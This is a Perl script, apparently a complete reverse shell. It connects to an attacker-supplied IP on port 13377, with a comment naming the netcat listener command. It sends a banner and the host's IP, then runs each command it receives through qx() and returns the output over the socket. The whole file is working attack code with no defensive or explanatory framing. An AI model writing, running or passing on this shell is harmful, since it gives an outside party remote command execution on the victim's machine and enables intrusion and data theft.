use strict;
use warnings;
use IO::Socket::INET;
use Sys::Hostname;
use IPC::Open2;

my $we = <<'ASCII';
  _____            _      _____          _      
 |  __ \          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
ASCII

my $po = 13377; # nc -l -p 13377

die "Please provide the IP address as a command-line argument.\n" unless @ARGV;

my $ip = $ARGV[0];
my $client_ip = gethostbyname(hostname()) || '';
$we .= "Client IP: $client_ip\n";

my $sock = IO::Socket::INET->new(
    PeerAddr => $ip,
    PeerPort => $po,
    Proto => 'tcp'
);

die "Error: $!\n" unless $sock;

print "$ip:$po\n";
print $sock "$we\n";

while (my $cmd = <$sock>) {
    last unless defined $cmd;

    print $sock "\$ ";

    $cmd = trim($cmd);

    if ($cmd eq 'exit') {
        last;
    }

    my $output = qx($cmd);
    print $sock $output;
}

close $sock;

sub trim {
    my $s = shift;
    $s =~ s/^\s+|\s+$//g;
    return $s;
}
